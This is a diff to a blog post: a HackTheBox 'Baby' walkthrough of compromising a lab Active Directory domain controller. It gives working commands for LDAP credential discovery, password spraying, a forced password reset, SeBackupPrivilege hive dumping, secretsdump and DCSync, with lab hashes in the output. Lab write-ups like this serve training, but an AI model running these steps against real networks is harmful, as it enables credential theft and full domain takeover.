@@ -1,19 +1,24 @@
 ---
-target_ip:
+title: "HTB: Baby"
+date: 2026-05-05
+draft: false
+tags: ["Active Directory", "Windows", "HackTheBox", "LDAP", "DCSync"]
+categories: ["Writeups"]
+description: "Walkthrough of the Baby Windows Active Directory box: LDAP enumeration, password reset via STATUS_PASSWORD_MUST_CHANGE, SeBackupPrivilege abuse, and a DCSync attack to full Domain Admin."
+target_ip: "10.129.32.56"
 os: Windows
 difficulty: Easy
 status: Complete
-date: 2026-05-05
 ---
 
-# 🚩 Box Name: {{Baby}}
+# 🚩 Box Name: Baby
 
 ## 📋 Initial Info
 - **Hostname:** `baby.vl`
 
 Baby is an easy Windows machine focused on Active Directory fundamentals. The attack path involves LDAP enumeration to identify misconfigured directory data, leading to the discovery of exposed credentials.
 
-After gaining initial access, the compromised user possesses the **`SeBackupPrivilege`**, which can be leveraged to dump the Domain Controller’s registry hives and escalate privileges to full Domain Admin.
+After gaining initial access, the compromised user possesses the **`SeBackupPrivilege`**, which can be leveraged to dump the Domain Controller's registry hives and escalate privileges to full Domain Admin.
 
 ---
 
@@ -92,7 +97,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 198.25 seconds
 ```
 
-
 Based on the output this appears to be a Domain Controller. I'll add `baby.vl` and `babydc.baby.vl` to my `/etc/hosts` file.
 
 I enumerated `SMB` without any luck since anonymous access is not allowed.
@@ -111,8 +115,7 @@ It's a lot of information so I passed it into a text file to search through.
 ldapdata  nmap
 ```
 
-
- With this data and i will search for users, accounts, groups, and passwords using `grep`.
+With this data and i will search for users, accounts, groups, and passwords using `grep`.
 
 I always start out by looking at the `description:` field as this sometimes has compromising information like passwords.
 
@@ -136,13 +139,11 @@ description: DNS clients who are permitted to perform dynamic updates on behal
 description: Set initial password to BabyStart123!
 ```
 
-
 In this case, a valid password was found: `BabyStart123!`.
 
 A set of usernames was also recovered, which can be compiled into a wordlist for further attacks. This opens the door for techniques like password spraying against additional accounts.
 
-The domain’s username format is now clear, allowing for more targeted enumeration. Tools like `Kerbrute` can be used to expand the user list and identify valid accounts.
-
+The domain's username format is now clear, allowing for more targeted enumeration. Tools like `Kerbrute` can be used to expand the user list and identify valid accounts.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Baby]
@@ -158,7 +159,6 @@ userPrincipalName: Teresa.Bell@baby.vl
 ```
 
 Plus I found `Caroline.Robinson@baby.vl` near the bottom of the `LDAP` data.
-
 
 Looking through the `LDAP` data collected it seems these credentials belong to the user `Teresa Bell` who belongs to the `IT` Group.
 
@@ -205,13 +205,11 @@ dSCorePropagationData: 16010101000416.0Z
 msDS-SupportedEncryptionTypes: 0
 ```
 
-
-Credentials open up a lot more opportunities for enumeration. 
+Credentials open up a lot more opportunities for enumeration.
 
 Next I'm going to check to see if these credentials are valid.
 
 The credentials did not work with the user Teresa Bell. I performed a quick password spray with the username list I created earlier but didn't get any hits.
-
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Baby]
@@ -232,22 +230,17 @@ SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Teresa.Bell:Baby
 SMB         10.129.32.56    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
 ```
 
-
-
 ```shell
 [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
 ```
-
 
 This result stands out. The credentials are valid, but the account requires a password change before it can be used interactively.
 
 After unsuccessfully testing the credentials elsewhere, I revisited the `Caroline.Robinson` account. Research showed that this condition can be leveraged to set a new password without prior authentication in the usual sense.
 
-
 ## ⚡ Exploitation (Initial Access)
 
 There are multiple ways to do this tools like `rpcclient` or `netexec` both support it. I opted for `smbpasswd`, which allowed me to successfully reset the password and gain access.
-
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Baby]
@@ -258,9 +251,7 @@ Retype new SMB password:
 Password changed for user Caroline.Robinson
 ```
 
-
 Password was changed to `Password123`
-
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Baby]
@@ -281,9 +272,7 @@ SMB         10.129.32.56    445    BABYDC           NETLOGON        READ        
 SMB         10.129.32.56    445    BABYDC           SYSVOL          READ            Logon server share
 ```
 
-
 I next checked to see if I could use winrm to login to the machine.
-
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Baby]
@@ -291,7 +280,6 @@ I next checked to see if I could use winrm to login to the machine.
 WINRM       10.129.32.56    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
 WINRM       10.129.32.56    5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123 (Pwn3d!)
 ```
-
 
 Pwn3d!
 
@@ -303,10 +291,9 @@ image
 
 ### Local Enumeration 
 
-Once I get a shell one of my first enumeration steps is to check my user's privileges. 
+Once I get a shell one of my first enumeration steps is to check my user's privileges.
 
 Right away without having to dig too much I see a dangerous privilege `SeBackupPrivilege`.
-
 
 ```shell
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv
@@ -324,12 +311,11 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
+`SeBackupPrivilege` is a built-in Windows privilege that allows a user to bypass normal file permissions for the purpose of backing up data. In practice, it means you can read almost any file on the system even ones you normally wouldn't have access to.
 
-`SeBackupPrivilege` is a built-in Windows privilege that allows a user to bypass normal file permissions for the purpose of backing up data. In practice, it means you can read almost any file on the system even ones you normally wouldn’t have access to.
+From an attacker's perspective, that's extremely useful. It can be abused to copy sensitive files like the **SAM**, **SYSTEM**, or **NTDS.dit** database directly from a Domain Controller. Once dumped, these files can be used to extract password hashes and ultimately escalate privileges, often all the way to Domain Admin.
 
-From an attacker’s perspective, that’s extremely useful. It can be abused to copy sensitive files like the **SAM**, **SYSTEM**, or **NTDS.dit** database directly from a Domain Controller. Once dumped, these files can be used to extract password hashes and ultimately escalate privileges, often all the way to Domain Admin.
-
-So I can do this a few ways. 
+So I can do this a few ways.
 
 #### Method 1
 1. Backup the **SAM** and **SYSTEM** hives
@@ -364,7 +350,6 @@ d-r---          5/8/2021   8:20 AM                Videos
 -a----          5/4/2026  10:51 PM          49152 sam
 -a----          5/4/2026  10:51 PM       20676608 system
 ```
-
 
 I created this following `diskshadowscript.txt` file:
 
@@ -422,21 +407,20 @@ SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS
 
 At this point, `diskshadow` throws an error notice it truncates `nowriters` to `nowriter`, which breaks execution. I suspected this might be an issue with the Evil-WinRM shell, so I re-tried using a Meterpreter session, but ran into similar problems.
 
-Even though I successfully dumped the **SAM** and **SYSTEM** hives (enough for local hash extraction), I didn’t have sufficient privileges to complete this method and access more sensitive files.
+Even though I successfully dumped the **SAM** and **SYSTEM** hives (enough for local hash extraction), I didn't have sufficient privileges to complete this method and access more sensitive files.
 
-The goal here is to retrieve the Domain Controller’s `ntds.dit`, which contains domain credential data. Attempts to create a shadow copy using `vssadmin` failed due to insufficient permissions, and other approaches didn’t succeed either.
+The goal here is to retrieve the Domain Controller's `ntds.dit`, which contains domain credential data. Attempts to create a shadow copy using `vssadmin` failed due to insufficient permissions, and other approaches didn't succeed either.
 
-After some research, I found an alternative technique using `diskshadow` to access `ntds.dit`, which I’ll cover next.
-
+After some research, I found an alternative technique using `diskshadow` to access `ntds.dit`, which I'll cover next.
 
 #### Note
 At this point, I already had the **SAM** and **SYSTEM** hives, which is enough to get value out of `secretsdump`. These two work together, SAM stores the local account hashes, while SYSTEM contains the boot key needed to decrypt them. With just those, you can recover local credentials from the machine.
 
 So why bother grabbing the **SECURITY** hive too?
 
-The answer is that SECURITY opens the door to a completely different set of secrets. While SAM focuses on local accounts, the SECURITY hive contains **LSA secrets**, which can include cached domain credentials, service account passwords, scheduled task credentials, and even DPAPI system keys. 
+The answer is that SECURITY opens the door to a completely different set of secrets. While SAM focuses on local accounts, the SECURITY hive contains **LSA secrets**, which can include cached domain credentials, service account passwords, scheduled task credentials, and even DPAPI system keys.
 
-In short, you don’t need the SECURITY hive to make `secretsdump` work but skipping it means missing out on some of the most valuable credentials available on the system.
+In short, you don't need the SECURITY hive to make `secretsdump` work but skipping it means missing out on some of the most valuable credentials available on the system.
 
 I failed to grab the `NTDS` hive with robocopy so I resorted to this second method.
 
@@ -444,12 +428,11 @@ I failed to grab the `NTDS` hive with robocopy so I resorted to this second meth
 
 `https://github.com/improsec/BackupOperatorToolkit`
 
+At first, it looked like I didn't have enough permissions to complete the attack. My attempts to use `diskshadow` and `vssadmin` kept failing, which made it seem like I was stuck. But that wasn't actually the case the issue was the method, not the privileges.
 
-At first, it looked like I didn’t have enough permissions to complete the attack. My attempts to use `diskshadow` and `vssadmin` kept failing, which made it seem like I was stuck. But that wasn’t actually the case the issue was the method, not the privileges.
+Even though `SeBackupPrivilege` is a powerful permission, it doesn't automatically grant access to everything. Tools like `diskshadow` rely on Volume Shadow Copy (VSS), which requires additional privileges beyond just backup rights. So while I had enough access to read sensitive files, I didn't have the specific permissions needed to create shadow copies.
 
-Even though `SeBackupPrivilege` is a powerful permission, it doesn’t automatically grant access to everything. Tools like `diskshadow` rely on Volume Shadow Copy (VSS), which requires additional privileges beyond just backup rights. So while I had enough access to read sensitive files, I didn’t have the specific permissions needed to create shadow copies.
-
-That’s where **BackupOperatorToolkit** came in. Instead of relying on VSS, it directly abuses `SeBackupPrivilege` the way it was intended. Under the hood, it uses Windows backup APIs to open and read protected files while bypassing normal file permissions. This allows access to critical files like the `SAM`, `SYSTEM`, and `SECURITY` hives and on a Domain Controller, even the `ntds.dit` database.
+That's where **BackupOperatorToolkit** came in. Instead of relying on VSS, it directly abuses `SeBackupPrivilege` the way it was intended. Under the hood, it uses Windows backup APIs to open and read protected files while bypassing normal file permissions. This allows access to critical files like the `SAM`, `SYSTEM`, and `SECURITY` hives and on a Domain Controller, even the `ntds.dit` database.
 
 I next compiled the `.sln` file and used the `DUMP` flag.
 
@@ -485,14 +468,13 @@ d-----         8/20/2025   9:07 AM                Windows
 -a----          5/5/2026   4:46 PM       20791296 SYSTEM
 ```
 
-
 This worked because it aligned perfectly with the privilege I had. Rather than trying to force a snapshot-based approach, it leveraged backup semantics to read files directly.
 
 So while both methods aim to achieve similar goals accessing protected system data they operate very differently. `diskshadow` depends on VSS and higher privileges, whereas BackupOperatorToolkit works purely with `SeBackupPrivilege`.
 
-One thing to keep in mind is that while this method is reliable, it’s not particularly stealthy. Accessing files like `SAM` or `ntds.dit` can generate logs and may be flagged in real environments. In a lab or CTF, that’s not a concern but in a real engagement, it’s something to be aware of.
+One thing to keep in mind is that while this method is reliable, it's not particularly stealthy. Accessing files like `SAM` or `ntds.dit` can generate logs and may be flagged in real environments. In a lab or CTF, that's not a concern but in a real engagement, it's something to be aware of.
 
-The main takeaway here is simple: having the right privilege isn’t always enough—you also need to use the right technique that matches it.
+The main takeaway here is simple: having the right privilege isn't always enough—you also need to use the right technique that matches it.
 
 Next part is straightforward. I used `impacket's secretsdump` to extract local hashes.
 
@@ -526,7 +508,6 @@ dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
 NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
 [*] Cleaning up...
 ```
-
 
 I next used the machine account to perform a DCSync attack.
 
@@ -568,14 +549,13 @@ SMB         10.129.32.56    445    BABYDC           [*] To extract only enabled 
 SMB         10.129.32.56    445    BABYDC           [*] grep -iv disabled /home/split/.nxc/logs/ntds/BABYDC_10.129.32.56_2026-05-05_123646.ntds | cut -d ':' -f1
 ```
 
-
 ## 📓 Lessons Learned
 
 I had two different approaches for pulling sensitive data from the Domain Controller, and it raised an important question. Could I have retrieved everything I needed from the first method?
 
-The short answer is yes, at least partially. Using `reg save`, I was already able to dump the **SAM** and **SYSTEM** hives thanks to `SeBackupPrivilege`. If my `diskshadow` attempt had worked, I could have just as easily copied the **SECURITY** hive from the shadow copy as well. The issue wasn’t capability—it was that Volume Shadow Copy (VSS) wasn’t cooperating in my shell, which blocked that path entirely.
+The short answer is yes, at least partially. Using `reg save`, I was already able to dump the **SAM** and **SYSTEM** hives thanks to `SeBackupPrivilege`. If my `diskshadow` attempt had worked, I could have just as easily copied the **SECURITY** hive from the shadow copy as well. The issue wasn't capability—it was that Volume Shadow Copy (VSS) wasn't cooperating in my shell, which blocked that path entirely.
 
-Originally, the goal of that method wasn’t just to grab registry hives it was to go after the real prize: the `ntds.dit` file. This file contains the full Active Directory database, including all domain user hashes. The plan was to create a shadow copy and then use something like `robocopy` to pull `ntds.dit` offline for parsing. Since the VSS step failed, that approach never fully materialized.
+Originally, the goal of that method wasn't just to grab registry hives it was to go after the real prize: the `ntds.dit` file. This file contains the full Active Directory database, including all domain user hashes. The plan was to create a shadow copy and then use something like `robocopy` to pull `ntds.dit` offline for parsing. Since the VSS step failed, that approach never fully materialized.
 
 Using `BackupOperatorToolkit` in the second method improved things. It let me successfully dump **SAM**, **SYSTEM**, and **SECURITY** by properly abusing `SeBackupPrivilege`. That gave me local hashes and LSA secrets, which is useful but still not the complete domain picture.
 
@@ -585,8 +565,8 @@ Instead of continuing to fight with offline extraction, I pivoted to a much clea
 nxc smb baby.vl -u BabyDC\$ -H 3d538eabff6633b62dbaa5fb5ade3b4d --ntds
 ```
 
-This worked because I was using the machine account of the Domain Controller itself. DC machine accounts have built-in replication privileges, which means they’re allowed to request password data from Active Directory. With DCSync, I didn’t need to touch `ntds.dit` at all instead, I simply asked the Domain Controller to replicate its secrets to me.
+This worked because I was using the machine account of the Domain Controller itself. DC machine accounts have built-in replication privileges, which means they're allowed to request password data from Active Directory. With DCSync, I didn't need to touch `ntds.dit` at all instead, I simply asked the Domain Controller to replicate its secrets to me.
 
-That’s the key difference. Rather than stealing and parsing the database offline, DCSync interacts with Active Directory the way another DC would. It’s faster, more reliable, and avoids the complications of shadow copies and file locking.
+That's the key difference. Rather than stealing and parsing the database offline, DCSync interacts with Active Directory the way another DC would. It's faster, more reliable, and avoids the complications of shadow copies and file locking.
 
 In the end, while both methods can lead to the same goal, DCSync is the more direct path once you have the right level of access.
